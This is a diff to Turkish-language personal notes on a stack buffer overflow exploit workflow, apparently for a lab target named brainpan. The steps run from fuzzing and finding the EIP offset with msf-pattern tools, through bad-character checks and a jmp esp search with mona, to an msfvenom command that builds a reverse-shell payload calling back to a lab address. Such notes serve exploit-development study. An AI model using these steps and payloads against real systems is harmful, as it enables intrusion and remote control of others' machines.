@@ -2,16 +2,22 @@
 
 2)msf-pattern_create kullanaraj fuzzingden çıkan sonucun 100 üstünü kullanarak tam yer bulmaya çalış
 
-3)msf-pattern_create den çıkan sonucu offset e koyarak çalıştır
+3)msf-pattern_create den çıkan sonucu sunucuya "sonuçBBBB" olarak yapıştır
 
 4)immuity debugger üzerinden eip nin üzerindeki crash yazısını kopyala ve msf-pattern_offset -l "create e ne yazdıysan" -q eip deki sonuç yazarak tam sonucu bul
 
 5)afterip.py kullanarak tam denk gelen numarayı test et
 
-6)başarılı olursa badcharacters.py kullanarak badchar ları bulmaya çalış
+6)başarılı olursa afterip nin buffer sounua badchars ları yapıştır, ardından immunity debugger da "!mona bytearray -b "\x00"" yazarak temiz bir badchar karşılaştırması için bunu yaz sonuç C dizininde mona altına kayıt edilecek (C:\mona\brainpan\bytearray.bin)
 
-7)immunity debugger üzerinden !mona find -s "\xff\xe4" -m uygulama.exe yazarak jmp esp yi bul
+7) Ardından afterip'ye badcharsı koyarak çalıştır. immunity debugger üzerinde "414141" üstünde olan yeri kopyala ("üstten 5.[ESP]"). Sonrasında "!mona compare -f C:\path\to\bytearray.bin -a 005FF910" yazarak badchar bar mı diye karşılaştır.
 
-8)jmp esp kodunu \xas\xab\xac şeklinde yazarak shellcode oluştur
+8) Örneğin var ise şu şekilde "00 07 08 2e 2f a0 a1" yeni bir bytearray oluştur "!mona bytearray -b "\x00\x07\x08\xa0\xa1\x2e\x2f""
 
-9) son
+9)immunity debugger üzerinden !mona jmp -r esp -cpb "\x00" yazarak jmp esp yi bul. badchar var ise böyle "!mona jmp -r esp -cpb "\x00\x07\x08\xa0\xa1\x2e\x2f""
+
+10)Ekranı küçültünce log datada result olarak gösterilir("0x311712f3") şeklinde.
+
+11) msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.157.58 LPORT=4545 -f python -b "\x00" (-b yerinde badcharları koyuyurouz)
+
+12) ardından exploite çıkan kodu yerleştir ve esp kodumuz şu an "0x311712f3" bunu şu şekilde yaz "\xf3\x12\x17\x31"
